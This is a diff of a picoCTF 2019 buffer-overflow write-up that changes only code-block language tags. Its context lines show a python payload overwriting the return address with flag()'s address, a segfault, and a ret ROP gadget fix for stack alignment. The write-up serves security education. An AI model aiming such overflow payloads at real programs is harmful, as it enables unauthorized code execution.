@@ -45,7 +45,7 @@ We get control of eip..!
 We put in the address of the flag() ```\x67\x07\x40\x00\x00\x00\x00\x00```function instead of ```"C"*6``` to change code flow towards our flag() function.
 
 We expect this to give us the flag ...but it doesn't .We end up getting a segfault.
-``` bash
+``` console
   arch3r@1nv4d3r:~/p1c0CTF_2019/N3w_0v3rflow$ python -c 'print("A"*72+"\x67\x07\x40\x00\x00\x00\x00\x00")' | ./vuln
   Welcome to 64-bit. Give me a string that gets you the flag: 
   Segmentation fault (core dumped)
@@ -74,7 +74,7 @@ Ok .. so we ended up messing the stack alignment with our payload, we have to ma
 The simple fix for this is to use a ret ROPgadget ,it executes a ret instruction right before the jump to flag() which helps align the rsp register.
 
 lets add this to our exploit and run it.
-```bash
+```console
 [+] Starting local process './vuln': pid 12338
 Welcome to 64-bit. Give me a string that gets you the flag: 
 
